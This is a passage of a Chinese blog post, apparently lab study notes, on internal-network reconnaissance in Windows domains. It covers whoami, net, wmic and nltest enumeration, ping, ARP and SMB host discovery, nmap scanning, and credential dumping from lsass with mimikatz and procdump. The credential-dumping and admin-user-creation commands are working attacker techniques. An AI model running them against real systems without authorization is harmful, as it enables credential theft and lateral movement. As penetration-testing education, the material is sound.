        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>当渗透测试人员通过 Web 渗透或其他方式获得服务器主机的权限后，需要以该主机为跳板，对其内网环境进行渗透。对于攻陷的第一台主机，其在内网中所处的网络位置当前登录的用户、该用户有什么样的权限、其操作系统信息、网络配置信息及当前运行的进程信息等都是未知的，这就需要测试人员以当前主机为中心进行信息收集。</p><h1 id="本机基础信息搜集"><a href="#本机基础信息搜集" class="headerlink" title="本机基础信息搜集"></a>本机基础信息搜集</h1><p><strong>查看当前用户、权限</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">whoami /all<br></code></pre></td></tr></table></figure><p>查看当前用户以及当前用户所处的用户组、所拥有的特权等信息，测试<br>人员可以对当前用户所拥有的特权有一个大致的了解，并综合判断是否需要提升权限。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094322829.png" alt="image-20240318094322829"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094352206.png" alt="image-20240318094352206"></p><p><strong>查看网络配置信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig /all<br></code></pre></td></tr></table></figure><p>查看当前主机的网络配置情况，包括主机的IP 地址、主机名、各网络适配器的信息可以从中判断出当前主机所处的内网网段</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094527225.png" alt="image-20240318094527225"></p><p><strong>查看主机路由信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">route print<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318094752859.png" alt="image-20240318094752859"></p><p>在路由表中的“网络目标”都是主机可以直接访问到的，测试人员在后续的横向渗透中可以尝试探测相关地址段的存活主机。</p><p><strong>查看操作系统信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br>systeminfo | findstr /B /C:&quot;0S Name&quot; /C:&quot;0S Version&quot; # 查看操作系统及版本<br>systeminfo | findstr /B /C:&quot;0S 名称&quot; /C:&quot;0S 版本&quot; #查看操作系统及版本<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318095114506.png" alt="image-20240318095114506"></p><p><strong>查看端口连接信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318133421621.png" alt="image-20240318133421621"></p><p>这里可以看到有哪些外部主机与本机建立连接，从这里可以收集内网地址段的信息，如果有内网主机连接就会显示地址信息，我这里连个百度网站来看看外部地址的变化</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318133826701.png" alt="image-20240318133826701"></p><p><strong>查看当前会话列表</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net session<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134119130.png" alt="image-20240318134119130"></p><p>查看当前主机与所连接的客户端主机之间的会话，我这里还没有建立连接</p><p><strong>查看当前网络共享信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use<br></code></pre></td></tr></table></figure><p>查看当前主机与其他主机远程建立的网络共享连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134359209.png" alt="image-20240318134359209"></p><p><strong>查看当前进程信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">tasklist<br>tasklist /SVC<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134424067.png" alt="image-20240318134424067"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134445449.png" alt="image-20240318134445449"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process get Name,ProcessId,ExecutablePath<br></code></pre></td></tr></table></figure><p>该命令可以i查询主机进程信息，并过滤出进程的路径、名称和PID<img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318134935916.png" alt="image-20240318134935916"></p><p>WMIC 是微软为 Windows管理规范(Windows Management Instrumentation，WMI)提供的一个命令行工具，提供从命令行接口和批处理脚本执行系统管理的支持。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic process where Name=&quot;conhost.exe&quot; get ExecutablePath<br></code></pre></td></tr></table></figure><p>该命令可以查看指定进程的路径信息</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318135201960.png" alt="image-20240318135201960"></p><p><strong>查看当前服务信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get Caption, Name,PathName, StartName, State<br></code></pre></td></tr></table></figure><p>该命令查看当前所有服务的信息，并过滤出服务的名称、路径、创建时间、运行状态信息。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318181750072.png" alt="image-20240318181750072"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service where Name=&quot;themes&quot; get Caption,PathName,State<br></code></pre></td></tr></table></figure><p>查看指定服务的信息，并过滤出服务名称、路径和运行状态</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318182232588.png" alt="image-20240318182232588"></p><p><strong>查看计划任务信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /query /v /fo list<br></code></pre></td></tr></table></figure><p>该命令查看当前主机上所有的计划任务</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318182513357.png" alt="image-20240318182513357"></p><p><strong>查看自启程序信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic startup get Caption,Command，Location，User<br></code></pre></td></tr></table></figure><p>该命令查看当前主机上所有的自启程序信息，并过滤出程序名称、所执行的命令、程序的路径所属用户</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318182709052.png" alt="image-20240318182709052"></p><p><strong>查看系统补丁安装信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>查看当前主机安装的补丁列表，并过滤出补丁链接、名称、描述、补丁编号以及安装时间；通常，测试人员可以根据目标主机的操作系统版本和缺少的补丁来辅助后面的提权操作。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318214819594.png" alt="image-20240318214819594"></p><p><strong>查看应用安装信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic product get Caption,Version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318214855646.png" alt="image-20240318214855646"></p><p><strong>查看本地用户&#x2F;组信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user<br>net user &lt;username&gt; #查看指定用户详细信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215359151.png" alt="image-20240318215359151"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net localgroup administrators #查看本地管理员组<br></code></pre></td></tr></table></figure><p>可以看到，本地管理员组中除了本地管理员 Administrator，还包含域全局组clown，其在该主机加入域时自动被添加到计算机本地Administrators 组中，所以Domain Admins 组拥有该计算机的管理权限，那么我们就可以创建一个新的本地用户加入到本地管理员组</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215328201.png" alt="image-20240318215328201"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; &lt;password&gt; /add  #创建本地用户<br>net localgroup administrators &lt;username&gt; /add  #将用户加入本地管理员组<br></code></pre></td></tr></table></figure><p><strong>查看当前登陆用户</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">query user<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215825045.png" alt="image-20240318215825045"></p><h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><p><strong>判断是否存在域环境</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net config workstation<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324193823102.png" alt="image-20240324193823102"></p><p>查看当前工作站的信息，包括当前计算机名、用户名、系统版本、工作站、登录的域等</p><p><strong>查看域用户信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user /domain  #查看所有的域用户<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324194158121.png" alt="image-20240324194158121"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; /domain #查看指定域用户信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324194257681.png" alt="image-20240324194257681"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic useraccount get Caption,Domain,Description #获取所有用户的SID、所属域和用户描述信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324195119836.png" alt="image-20240324195119836"></p><blockquote><p>注意，只有域用户才有权限执行域内查询操作。而计算机本地用户除非提升为本地系统权限，否则只能查询本机信息，无法查询域内信息并提示“拒绝访问”。这是因为，在域环境中，所有与域有关的查询都需要通过域控制器来实现，并且需要经过Kerberos协议进行认证。</p></blockquote><p><strong>查看域用户组信息</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group /domain #列出域内的所有用户组<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324195844774.png" alt="image-20240324195844774"></p><p>还可以通过上面的信息来指定用户组来查询详细信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain #比如这个查询域管理员组的用户<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324200516235.png" alt="image-20240324200516235"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Computers&quot; /domain #可以得到域内所有的客户端主机<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324200614099.png" alt="image-20240324200614099"></p><p>下面是一些常见组</p><table><thead><tr><th>域组名称</th><th>说明</th></tr></thead><tbody><tr><td>Domain Admins</td><td>域管理员组，包括所有的域管理员用户</td></tr><tr><td>Domain Computers</td><td>域成员主机组，包括加入域的所有工作站和服务器</td></tr><tr><td>Domain Controllers</td><td>域控制器组，包括域中的所有域控制器</td></tr><tr><td>Domain Guests</td><td>域来宾组，包括域中所有的来宾用户</td></tr><tr><td>Domain Users</td><td>域用户组，包括所有域用户</td></tr><tr><td>Enterprise Admins</td><td>企业系统管理员组，适用于域林范围</td></tr></tbody></table><blockquote><p>在默认情况下，Domain Admins 组和Enterprise Admins 组中的用户对域内所有域控制器和域成员主机拥有完全控制权限。Enterprise Admins 组是一个通用组，是域林的根域中的一个组，并且其中的成员对域林中的所有域拥有完全控制权限而 Domain Admins 组是一个全局组，只对本域拥有完全控制权限。</p></blockquote><p><strong>查看域内密码策略</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net accounts /domain #查询域内用户的密码策略<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324201409096.png" alt="image-20240324201409096"></p><p><strong>查看域控制器列表</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202036188.png" alt="image-20240324202036188"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /DCLIST:hacke.testlab  #用于查询指定域内的域控主机列表<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202555802.png" alt="image-20240324202555802"></p><p><strong>查看主域控制器</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net time /domain<br></code></pre></td></tr></table></figure><p>在域环境中，主域控制器会同时被用作时间服务器，使得域中所有计算机的时钟同步。执行以下命令，通过查询时间服务器来找到主域控制器的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202703091.png" alt="image-20240324202703091"></p><p><strong>定位域控制器</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ping DC.hacke.testlab<br></code></pre></td></tr></table></figure><p>通过上面知道目标主机的主机名后，可以直接对主机名执行ping命令，根据执行返回的内容即可得知目标主机在内网中的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202858493.png" alt="image-20240324202858493"></p><p>除此之外，域控制器往往会被用作DNS服务器，所以找到当前主机的DNS服务器地址也可以定位域控。</p><p><strong>查看信任关系</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /domain_trusts<br></code></pre></td></tr></table></figure><p>域信任用于多域环境中的跨域资源的共享。一般情况下，一个域的用户只能访问本域内的资源，无法访问其他域的资源，而要想不同域之间实现互访就需要建立域信任。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324203208639.png" alt="image-20240324203208639"></p><h1 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h1><p>在内网渗透中，测试人员往往需要通过各种内网扫描技术来探测内网资源的情况，为后续的横向渗透做准备，通常需要发现内网存活的主机，并探测主机的操作系统、主机开放了哪些端口、端口上运行了哪些服务、服务的当前版本是否存在已知漏洞等信息。这些信息可以帮助测试人员发现内网的薄弱资源，确定后续的攻击方向。</p><h2 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h2><p>渗透测试中可以根据主机情况，上传工具进行主机存货探测，也可以借助内网代理或者路由转发对目标主机所处的局域网进行探测。</p><p><strong>基于ICMP发现存活主机</strong></p><p>ping命令就是利用ICMP数据报来确认主机是否存活，下面命令可以循环探测整个局域网C段中存活的主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.30.%I | findstr &quot;TTL=&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324204850543.png" alt="image-20240324204850543"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254)：这是一个 for 循环语句，用于迭代从 1 到 254 的数字。%I 是一个临时变量，它将在每次迭代中保存当前的数字。<br><br>@ping -w 1 -n 1 192.168.30.%I：在每次迭代中，该命令通过 ping 命令向局域网中的一个主机发送一个 ICMP 回显请求（ping 请求）。-w 1 指定超时时间为 1 毫秒，-n 1 指定只发送一个 ping 请求。192.168.30.%I 是要 ping 的目标主机的 IP 地址，其中 %I 表示当前迭代的数字。<br><br>| findstr &quot;TTL=&quot;：将前一个命令的输出通过管道传递给 findstr 命令，并使用 &quot;TTL=&quot; 作为过滤条件。findstr 命令用于在输出中查找包含指定文本的行。在这种情况下，它将筛选包含 &quot;TTL=&quot; 的行，因为这是 ICMP 回显响应中的一个标识符。<br><br>/L表示数字类型的循环，除此之外还有下面这些：<br>/F：用于从文件中读取内容进行循环。可以指定要读取的文件路径，并使用特定的分隔符将文件内容拆分成多个部分进行迭代。<br><br>/R：用于递归地在目录结构中进行循环。可以指定一个目录路径，并在指定的目录及其子目录中进行递归遍历。<br><br>/D：用于循环遍历指定目录中的文件夹。<br><br>/IN：用于指定一个字符串列表，将列表中的每个字符串作为循环的一部分进行迭代。<br></code></pre></td></tr></table></figure><p><strong>基于 NetBIOS(网络基本输入&#x2F;输出系统)协议发现存活主机</strong></p><p>NetBIOS 提供 OSI&#x2F;RM的会话层(在TCP&#x2F;IP模型中包含在应用层中)服务，让不同计算机上运行的不同程序可以在局域网中互相连接和共享数据。</p><p>NetBIOS 的工作流程就是正常的机器名解析、查询、应答的过程。在 Windows 中，默认安装 TCP&#x2F;IP 后会自动安装 NetBIOS。</p><p>在实际利用时，向局域网的每个IP地址发送NetBIOS状态查询，可以获得主机名MAC 地址等信息。</p><blockquote><p>NBTScan 是一款用于扫描 Windows 网络上NetBIOS 名称的程序,用于发现内网中存活的 Windows 主机。NBTScan 可以对给定IP范围内的每个IP地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，会列出它的IP地址NetBIOS计算机名、登录用户名和MAC地址。工具地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p></blockquote><p>将工具上传到主机之后执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nbtscan 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324212209943.png" alt="image-20240324212209943"></p><p><strong>基于UDP发现存活主机</strong></p><p>在实际利用中，可以将一个空的UDP报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，UDP探测就马上得到一个ICMP端口无法到达的回应报文，这意味着该主机正在运行。如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应。</p><p>Unicornscan 是Kali Linux平台的一款信息收集工具，提供了网络扫描功能。执行以下命令，通过 UDP协议扫描内网的存活主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">unicornscan -mU 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324212621176.png" alt="image-20240324212621176"></p><p><strong>基于ARP发现存活主机</strong></p><p>在实际利用中，可以向网络发送一个ARP请求，若目标主机处于活跃状态，则其一定会回应一个 ARP 响应，否则不会做出任何回应。</p><ul><li>利用ARP-Scan</li></ul><p>ARP-Scan 是一款快速、便捷的内网扫描工具，利用 ARP 发现内网中存活的主机。将工具上传到目标主机，执行以下命令，即可扫描内网中存活的主机。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -t 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324213635193.png" alt="image-20240324213635193"></p><ul><li>利用powershell</li></ul><p>Empire 渗透框架的 Invoke-ARPScan.psl脚本可利用 ARP发现内网存活主机，工具地址：<a href="https://github.com/EmpireProject/Empire%E3%80%82(%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%E7%94%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%B2%A1%E6%89%BE%E5%88%B0powershell%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%A5%BD%E5%83%8F%E6%98%AF%E5%B7%B2%E7%BB%8F%E5%8F%96%E6%B6%88%E4%BA%86%EF%BC%8C%E6%8A%8A%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%BE%E8%BF%99)%E4%BD%BF%E7%94%A8%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%B0%86%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%85%A5%E6%89%A7%E8%A1%8C">https://github.com/EmpireProject/Empire。(暂时不会用，因为没找到powershell脚本，好像是已经取消了，把使用命令放这)使用时，需要将脚本导入执行</a>:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-ARPScan.ps1<br>Invoke-ARPScan -CIDR 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><strong>基于 SMB(Server Message Block，服务器消息块)协议发现存活主机</strong></p><p>SMB 又称为网络文件共享系统(CommonInternetFileSystem，CIFS)协议，是一种应用层传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通信等资源。CIFS 消息一般使用 NetBIOS 或 TCP 发送，分别使用139或 445 端口目前倾向于使用 445 端口。</p><p>在实际利用中，可以探测局域网中存在的SMB 服务，从而发现内网的存活主机，多适用于 Windows 主机的发现。</p><p>CrackMapExec(简称CME)是一款十分强大的后渗透利用工具，在KaliLinux上可以直接使用 apt-get命令进行安装。CrackMapExec能够枚举登录用户、枚举SMB服务列表、执行 WINRM 攻击等功能，可以帮助测试人员自动化评估大型域网络的安全性.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.30.1/24<br></code></pre></td></tr></table></figure><p>我的kali不在同一个网络检测不了，检测出来的效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324215607566.png" alt="image-20240324215607566"></p><h2 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h2><p>端口扫描就是用于探测主机开启了哪些服务，从而查找相应的漏洞进行攻击</p><p><strong>利用Telnet探测端口</strong></p><p>Telnet 是进行远程登录的标准协议和主要方式,为用户提供了在本地计算机上完成远程主机工作的能力。telnet命令可以简单测试指定的端口号是正常打开还是关闭状态。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324221045451.png" alt="image-20240324221045451"></p><p><strong>利用nmap进行端口扫描</strong></p><p>Nmap 是一个十分强大的端口扫描工具,在实际利用中可以借助内网代理对内网主机进行端口扫描。nmap的使用需要好好去学习，到时查查资料学习。</p><p>下面是一些常用的扫描命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -p 80,88,135,139,443,8080,3306,3389 172.25.87.14 #扫描目标主机的指定端口<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324221409497.png" alt="image-20240324221409497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sS -p 1-65535 172.25.87.14 #扫描目标主机的全部端口<br><br>nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #扫描并获取目标主机指定端口上开放的服务版本<br></code></pre></td></tr></table></figure><p><strong>利用PowerShell进行端口扫描</strong></p><p>NiShang 是基于PowerShell 的渗透测试专用框架，集成了各种脚本和Payload，广泛用于渗透测试的各阶段。<br>NiShang 的 Scan 模块中也有一个 Invoke-PortsCan.ps1 脚本，可以用来对主机进行端口扫描，工具地址：<a href="https://github.com/samratashok/nishang%E3%80%82">https://github.com/samratashok/nishang。</a></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324222008156.png" alt="image-20240324222008156"></p><p>执行下面命令对内网的一个主机范围执行默认的端口扫描，这里要先用管理员权限修改成可以执行脚本策略，然后导入模块再使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-PortScan.ps1<br>Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.20 -ResolveHost -ScanPort<br><span class="hljs-meta prompt_">#</span><span class="language-bash">还可以在后面再加上一个-Port选项指定扫描端口</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324223527832.png" alt="image-20240324223527832"></p><p><strong>利用MetaSploit探测内网</strong></p><p>MetaSploit 渗透框架中内置了几款资源收集模块，可用于发现内网存活主机、探测内网服务、对目标主机进行端口扫描，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324223901678.png" alt="image-20240324223901678"></p><p><strong>获取端口Banner信息</strong></p><p>Banner 中可能包含一些敏感信息。通过查看端口的Banner，测试人员往往可以获取软件开发商、软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用。</p><ul><li><p>利用NetCat获取端口Banner</p><p>Netcat 是一款常用的测试工具和黑客工具，使用 NetCat 可以轻易建立任何连接，具有“瑞士军刀”的美誉。</p><p>通过-nv选项可以在连接端口时获取该端口的Banner信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -nv &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324225257083.png" alt="image-20240324225257083"></p></li><li><p>利用Telnet获取端口Banner</p><p>如果目标端口开放，使用Telnet连接后，也会返回相应的Banner信息.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure></li><li><p>利用Nmap获取端口Banner</p><p>在Nmap中指定脚本**–script&#x3D;banner**就可以在扫描中获取端口的banner信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;<br></code></pre></td></tr></table></figure></li></ul><h1 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h1><p>在内网渗透中，当测试人员获取某台机器的控制权后，会以被攻陷的主机为跳板进行横向渗透，进一步扩大所掌控的资源范围。但是横向渗透中的很多攻击方法都需要先获取到域内用户的密码或哈希值才能进行，如哈希传递攻击、票据传递攻击等。所以在进行信息收集时，要尽可能收集域内用户的登录凭据等信息</p><h2 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h2><blockquote><p>在 Windows中,SAM文件是 Windows用户的账户数据库,位于系统的%SystemRoot%System32\Config 目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值对比，若相同，则认证成功。</p><p>lsass.exe是Windows的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后，登录的域名、用户名和登录凭据等信息会存储在lsass.exe的进程空间中，用户的明文密码经过 WDigest和 Tspkg模块调用后,会对其使用可逆的算法进行加密并存储在内存中。</p><p>用来获取主机的用户密码和哈希值的工具有很多,这些工具大多是通过读取 SAM 文件或者访问 lsass.exe 进程的内存数据等操作实现的。这些操作大多需要管理员权限，这意味着需要配合一些提权操作。</p></blockquote><p>下面利用Mimikatz工具来进行学习，Mimikatz是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域</p><p><strong>在线读取lsass进程内存</strong></p><p>将mimikatz上传到主机执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；sekurlsa::logonpasswords用于导出用户凭据</span><br></code></pre></td></tr></table></figure><p>可直接从lsass.exe进程的内存中读取当前已登录用户的凭据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324232522666.png" alt="image-20240324232522666"></p><p>不过我这里失败了不知道为什么，成功的话应该是下面这样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324233242439.png" alt="image-20240324233242439"></p><p>后来试了一下需要管理员权限，那应该是提权之后的事情了这一步</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324233522901.png" alt="image-20240324233522901"></p><p><strong>离线读取lsass内存文件</strong></p><p>除了在线读取，也可以直接将Isass.exe的进程内存转储，将内存文件导出到本地后使用 Mimikatz 进行离线读取。用于转储进程内存的工具有很多，如 OutMinidump.ps1、Procdump、SharpDump等，甚至可以手动加载系统自带的comsvcs.dll 来实现内存转储。</p><p>这里用微软官方提供的Procdump工具，首先要在主机上传该程序，然后执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">procdump.exe -accepteula -ma lsass.exe lsass.dmp #将lsass.exe的进程转储<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324234127358.png" alt="image-20240324234127358"></p><p>然后再执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sekurlsa::minidump lsass.dmp用于加载内存文件；sekurlsa::logonpasswords用于导出用户凭据； full 参数表示要输出全部可用的明文凭据信息，包括密码等详细信息；<span class="hljs-built_in">exit</span> 参数表示退出 Mimikatz 工具，结束当前会话。</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324234639154.png" alt="image-20240324234639154"></p><blockquote><p>注意,为了防止用户的明文密码在内存中泄露,微软在2014年5月发布了KB2871997补丁，关闭了 WDigest 功能，禁止从内存中获取明文密码，且 Windows Server 2012 及以上版本默认关闭 WDigest 功能。但是测试人员通过修改注册表，可以重新开启 WDigest功能，当用户注销或者重新登录后，就可以重新获取到用户的明文密码。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span 